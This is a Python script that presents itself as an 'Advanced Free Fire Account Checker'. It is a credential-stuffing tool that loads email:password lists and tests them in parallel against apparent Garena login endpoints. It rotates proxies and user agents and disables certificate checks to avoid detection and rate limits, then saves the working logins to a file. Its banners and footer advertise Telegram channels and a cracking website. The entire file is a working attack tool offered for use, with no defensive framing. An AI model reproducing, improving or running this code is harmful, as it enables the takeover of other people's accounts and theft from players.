import requests
import threading
import time
import json
import os
import sys
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Back:
        BLACK = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

class FreeFireAccountChecker:
    def __init__(self):
        self.valid_accounts = []
        self.checked_accounts = 0
        self.proxies = []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        
        # Configuration settings
        self.config = {
            "api_endpoints": [
                "https://account-freefire.intl.garena.com/api/account/login",
                "https://ff-account.intl.garena.com/api/auth/login", 
                "https://api.account.garena.com/api/account/login"
            ],
            "timeout": 10,
            "max_retries": 3,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
            ],
            "max_threads": 50,
            "request_delay": 0.1
        }
        
        self.load_config()
        self.setup_session()
        
    def load_config(self):
        """Load configuration from config.json or use defaults"""
        try:
            if os.path.exists('config.json'):
                with open('config.json', 'r', encoding='utf-8') as f:
                    user_config = json.load(f)
                    # Update default config with user values
                    for key, value in user_config.items():
                        if key in self.config:
                            self.config[key] = value
                print(f"{Fore.GREEN}✅ Configuration loaded from config.json{Style.RESET_ALL}")
            else:
                self.create_default_config()
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Config loading error: {str(e)}, using defaults{Style.RESET_ALL}")
    
    def create_default_config(self):
        """Create default configuration file"""
        try:
            with open('config.json', 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=4)
            print(f"{Fore.GREEN}✅ Default config.json created{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Could not create config.json: {str(e)}{Style.RESET_ALL}")
    
    def setup_session(self):
        """Setup HTTP session with random user agent"""
        user_agent = random.choice(self.config['user_agents'])
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://freefire.garena.com',
            'Referer': 'https://freefire.garena.com/',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def display_banner(self):
        self.clear_screen()
        banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                ║
{Fore.RED}║  ███████╗██████╗ ███████╗███████╗    ███████╗██╗██████╗ ███████╗║
{Fore.RED}║  ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║██╔══██╗██╔════╝║
{Fore.RED}║  █████╗  ██████╔╝█████╗  █████╗      █████╗  ██║██████╔╝█████╗  ║
{Fore.RED}║  ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██╔══╝  ██║██╔══██╗██╔══╝  ║
{Fore.RED}║  ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗║
{Fore.RED}║  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝║
{Fore.RED}║                                                                ║
{Fore.CYAN}║                  🄳 🄰 🅁 🄺 🄱 🄾 🅂 🅂 𝟙 🄱 🄳                  ║
{Fore.RED}║                                                                ║
{Fore.GREEN}║           Advanced Free Fire Account Checker v3.0            ║
{Fore.RED}║                                                                ║
{Fore.RED}╚════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
        print(f"{Fore.YELLOW}🔹 {Fore.CYAN}Telegram: {Fore.WHITE}https://t.me/darkvaiadmin")
        print(f"{Fore.YELLOW}🔹 {Fore.CYAN}Channel: {Fore.WHITE}https://t.me/windowspremiumkey")
        print(f"{Fore.YELLOW}🔹 {Fore.CYAN}Website: {Fore.WHITE}https://crackyworld.com/")
        print(f"{Fore.RED}═" * 60 + Style.RESET_ALL)

    def load_proxies(self, filename):
        """Load proxies from file with validation"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                proxies = [line.strip() for line in f if line.strip() and not line.startswith('#') and ':' in line]
            
            valid_proxies = []
            for proxy in proxies:
                if self.validate_proxy(proxy):
                    valid_proxies.append(proxy)
            
            self.proxies = valid_proxies
            print(f"{Fore.GREEN}✅ Loaded {len(self.proxies)} valid proxies from {filename}{Style.RESET_ALL}")
            return True
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Proxy file '{filename}' not found!{Style.RESET_ALL}")
            return False

    def validate_proxy(self, proxy):
        """Validate proxy format"""
        if ':' not in proxy:
            return False
        
        try:
            if '@' in proxy:
                # Format: user:pass@ip:port
                auth_part, server_part = proxy.split('@')
                if ':' not in auth_part or ':' not in server_part:
                    return False
                user, password = auth_part.split(':')
                ip, port = server_part.split(':')
                return port.isdigit() and int(port) > 0 and int(port) <= 65535
            else:
                # Format: ip:port
                parts = proxy.split(':')
                if len(parts) == 2:
                    return parts[1].isdigit() and int(parts[1]) > 0 and int(parts[1]) <= 65535
        except:
            return False
        return False

    def get_proxy_dict(self):
        """Get proxy dictionary for requests"""
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        try:
            if '@' in proxy:
                # Format: user:pass@ip:port
                auth_part, server_part = proxy.split('@')
                user, password = auth_part.split(':')
                ip, port = server_part.split(':')
                return {
                    'http': f'http://{user}:{password}@{ip}:{port}',
                    'https': f'https://{user}:{password}@{ip}:{port}'
                }
            else:
                # Format: ip:port
                ip, port = proxy.split(':')
                return {
                    'http': f'http://{ip}:{port}',
                    'https': f'https://{ip}:{port}'
                }
        except:
            return None

    def rotate_user_agent(self):
        """Rotate to a new random user agent"""
        user_agent = random.choice(self.config['user_agents'])
        self.session.headers['User-Agent'] = user_agent

    def check_freefire_account(self, email, password):
        """
        Actual Free Fire account verification using real API endpoints
        """
        for retry in range(self.config['max_retries']):
            try:
                proxies = self.get_proxy_dict()
                self.rotate_user_agent()
                
                payload = {
                    'email': email,
                    'password': password,
                    'client_id': 'garena_web',
                    'grant_type': 'password',
                    'scope': 'user_profile'
                }
                
                # Try each API endpoint
                for endpoint in self.config['api_endpoints']:
                    try:
                        response = self.session.post(
                            endpoint,
                            json=payload,
                            proxies=proxies,
                            timeout=self.config['timeout'],
                            verify=False
                        )
                        
                        # Analyze response
                        if response.status_code == 200:
                            data = response.json()
                            
                            # Successful authentication indicators
                            if 'access_token' in data or 'token' in data:
                                return True, "ACCOUNT_VALID"
                            elif 'account_id' in data or 'user_id' in data:
                                return True, "ACCOUNT_VALID"
                            
                        elif response.status_code == 400:
                            data = response.json()
                            if 'error' in data:
                                if data['error'] == 'invalid_grant':
                                    return False, "INVALID_CREDENTIALS"
                                elif data['error'] == 'account_not_found':
                                    return False, "ACCOUNT_NOT_FOUND"
                                    
                        elif response.status_code == 401:
                            return False, "UNAUTHORIZED_ACCESS"
                            
                        elif response.status_code == 403:
                            return False, "ACCESS_FORBIDDEN"
                            
                        elif response.status_code == 429:
                            time.sleep(2)  # Rate limiting
                            continue
                            
                        elif response.status_code == 500:
                            continue  # Try next endpoint
                            
                    except requests.exceptions.RequestException:
                        continue
                
                # If all endpoints failed
                return False, "AUTHENTICATION_FAILED"
                
            except Exception as e:
                if retry == self.config['max_retries'] - 1:
                    return False, f"NETWORK_ERROR: {str(e)}"
                time.sleep(1)
        
        return False, "MAX_RETRIES_EXCEEDED"

    def validate_account_format(self, account_data):
        """Validate account format"""
        if ':' not in account_data:
            return False, None, None
        
        parts = account_data.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        
        # Enhanced email validation
        if '@' not in email or '.' not in email:
            return False, email, password
        
        if len(email) < 5 or len(email) > 255:
            return False, email, password
            
        # Password validation
        if len(password) < 4 or len(password) > 100:
            return False, email, password
            
        return True, email, password

    def check_account(self, account_data):
        """Check individual account"""
        try:
            valid_format, email, password = self.validate_account_format(account_data)
            if not valid_format:
                with self.lock:
                    self.checked_accounts += 1
                return f"{Fore.RED}❌ INVALID_FORMAT | {account_data}{Style.RESET_ALL}"
            
            # Add small delay to avoid rate limiting
            time.sleep(self.config['request_delay'])
            
            # Actual Free Fire account check
            is_valid, status = self.check_freefire_account(email, password)
            
            with self.lock:
                self.checked_accounts += 1
            
            if is_valid:
                result = f"{Fore.GREEN}✅ VALID | {email}:{password} | Status: {status}{Style.RESET_ALL}"
                self.valid_accounts.append({
                    'email': email,
                    'password': password,
                    'status': status,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
            else:
                if "ERROR" in status or "FAILED" in status:
                    color = Fore.MAGENTA
                else:
                    color = Fore.RED
                result = f"{color}❌ INVALID | {email}:{password} | Status: {status}{Style.RESET_ALL}"
                
            return result
                
        except Exception as e:
            with self.lock:
                self.checked_accounts += 1
            return f"{Fore.MAGENTA}⚠️ CHECK_ERROR | {account_data} | Error: {str(e)}{Style.RESET_ALL}"

    def save_results(self):
        """Save valid accounts with detailed information"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"freefire_valid_accounts_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("╔════════════════════════════════════════════════════════════════╗\n")
            f.write("║                    FREE FIRE VALID ACCOUNTS                   ║\n")
            f.write("║                      darkboss1bd Professional                 ║\n")
            f.write("╚════════════════════════════════════════════════════════════════╝\n\n")
            f.write("Contact Information:\n")
            f.write("Telegram: https://t.me/darkvaiadmin\n")
            f.write("Channel:  https://t.me/windowspremiumkey\n")
            f.write("Website:  https://crackyworld.com/\n")
            f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
            f.write("Total Valid: " + str(len(self.valid_accounts)) + " accounts\n")
            f.write("=" * 70 + "\n\n")
            
            for i, account in enumerate(self.valid_accounts, 1):
                f.write(f"Account #{i}:\n")
                f.write(f"Email:     {account['email']}\n")
                f.write(f"Password:  {account['password']}\n")
                f.write(f"Status:    {account['status']}\n")
                f.write(f"Checked:   {account['timestamp']}\n")
                f.write("-" * 50 + "\n")
        
        return filename

    def print_progress(self, total):
        """Display progress bar"""
        if total == 0:
            return
        progress = (self.checked_accounts / total) * 100
        bar_length = 40
        filled_length = int(bar_length * progress // 100)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        stats = f"Valid: {len(self.valid_accounts)} | Checked: {self.checked_accounts}/{total}"
        print(f"\r{Fore.CYAN}Progress: [{bar}] {progress:.1f}% | {stats}{Style.RESET_ALL}", end='', flush=True)

    def load_accounts(self, filename):
        """Load accounts from file with validation"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                accounts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            valid_accounts = []
            invalid_format = 0
            
            for account in accounts:
                if self.validate_account_format(account)[0]:
                    valid_accounts.append(account)
                else:
                    invalid_format += 1
            
            if invalid_format > 0:
                print(f"{Fore.YELLOW}⚠️  Found {invalid_format} accounts with invalid format{Style.RESET_ALL}")
            
            return valid_accounts
            
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Account file '{filename}' not found!{Style.RESET_ALL}")
            return []

    def display_config_info(self):
        """Display current configuration"""
        print(f"{Fore.CYAN}🔧 Current Configuration:{Style.RESET_ALL}")
        print(f"   API Endpoints: {len(self.config['api_endpoints'])}")
        print(f"   Timeout: {self.config['timeout']}s")
        print(f"   Max Retries: {self.config['max_retries']}")
        print(f"   User Agents: {len(self.config['user_agents'])}")
        print(f"   Max Threads: {self.config['max_threads']}")
        print(f"   Request Delay: {self.config['request_delay']}s")

    def main(self):
        """Main application function"""
        self.display_banner()
        self.display_config_info()
        print(f"{Fore.RED}═" * 60 + Style.RESET_ALL)
        
        # Proxy configuration
        proxy_file = input(f"{Fore.YELLOW}📁 Enter proxy file name (proxies.txt): {Style.RESET_ALL}").strip()
        if not proxy_file:
            proxy_file = "proxies.txt"
            
        if os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
        else:
            print(f"{Fore.YELLOW}🔹 Running without proxies{Style.RESET_ALL}")
        
        # Account file input
        account_file = input(f"{Fore.YELLOW}📁 Enter account list file name (accounts.txt): {Style.RESET_ALL}").strip()
        if not account_file:
            account_file = "accounts.txt"
        
        accounts = self.load_accounts(account_file)
        if not accounts:
            return
        
        print(f"{Fore.GREEN}📋 Loaded {len(accounts)} valid format accounts{Style.RESET_ALL}")
        
        # Thread configuration
        try:
            max_threads = min(self.config['max_threads'], len(accounts))
            threads = int(input(f"{Fore.YELLOW}🧵 Enter number of threads (1-{max_threads}): {Style.RESET_ALL}") or "20")
            threads = max(1, min(max_threads, threads))
        except ValueError:
            threads = 20
        
        print(f"{Fore.CYAN}🚀 Starting Free Fire account verification...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔧 Configuration: {threads} threads, {len(self.proxies) if self.proxies else 'no'} proxies{Style.RESET_ALL}")
        print(f"{Fore.RED}═" * 60 + Style.RESET_ALL)
        
        start_time = time.time()
        
        # Start account checking
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.check_account, account) for account in accounts]
            
            for future in futures:
                try:
                    result = future.result()
                    print(result)
                    self.print_progress(len(accounts))
                except Exception as e:
                    print(f"{Fore.RED}❌ Thread execution error: {str(e)}{Style.RESET_ALL}")
        
        end_time = time.time()
        
        print(f"\n{Fore.RED}═" * 60 + Style.RESET_ALL)
        
        # Display final results
        print(f"\n{Fore.CYAN}📊 CHECKING COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Total Accounts Checked: {self.checked_accounts}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Valid Accounts Found: {len(self.valid_accounts)}{Style.RESET_ALL}")
        
        if self.checked_accounts > 0:
            success_rate = (len(self.valid_accounts) / self.checked_accounts) * 100
            color = Fore.GREEN if success_rate > 0 else Fore.RED
            print(f"{color}✅ Success Rate: {success_rate:.2f}%{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}⏰ Time Taken: {end_time - start_time:.2f} seconds{Style.RESET_ALL}")
        
        # Save results
        if self.valid_accounts:
            saved_file = self.save_results()
            print(f"{Fore.GREEN}💾 Valid accounts saved to: {saved_file}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}📭 No valid accounts found{Style.RESET_ALL}")
        
        # Footer information
        print(f"\n{Fore.CYAN}🔹 Follow for more professional tools{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📱 Telegram: {Fore.WHITE}https://t.me/darkvaiadmin{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📢 Channel: {Fore.WHITE}https://t.me/windowspremiumkey{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 Website: {Fore.WHITE}https://crackyworld.com/{Style.RESET_ALL}")

def create_sample_files():
    """Create sample configuration files"""
    # Sample proxies file
    with open('proxies.txt', 'w', encoding='utf-8') as f:
        f.write("""# Add your proxies here in format: ip:port or user:pass@ip:port
# Example:
# 127.0.0.1:8080
# username:password@proxy.com:3128

""")
    
    # Sample accounts file
    with open('accounts.txt', 'w', encoding='utf-8') as f:
        f.write("""# Add your accounts in format: email:password
# Example:
# example@gmail.com:password123
# test@yahoo.com:securepass

""")

if __name__ == "__main__":
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    checker = FreeFireAccountChecker()
    
    # Create sample files if they don't exist
    if not os.path.exists('accounts.txt'):
        create_sample_files()
        print(f"{Fore.YELLOW}📁 Sample files created: accounts.txt, proxies.txt{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚠️  Please add your accounts and proxies to these files{Style.RESET_ALL}")
        time.sleep(2)
    
    try:
        checker.main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}⏹️ Process interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Application error: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}Press Enter to exit...{Style.RESET_ALL}")
